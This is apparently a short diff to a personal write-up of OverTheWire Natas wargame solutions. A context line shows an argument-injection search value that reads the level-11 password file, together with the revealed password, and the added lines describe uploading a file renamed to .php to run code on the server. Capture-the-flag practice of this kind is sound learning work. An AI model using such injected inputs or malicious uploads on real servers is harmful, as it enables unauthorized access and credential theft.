@@ -66,3 +66,12 @@ natas10: param
 needle: -v aaa /etc/natas_webpass/natas11 
 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 ```
+
+level11 - level12
+```
+```
+
+level12 - level13
+```
+change the file extension to .php, then the uploaded file can run php command.
+```
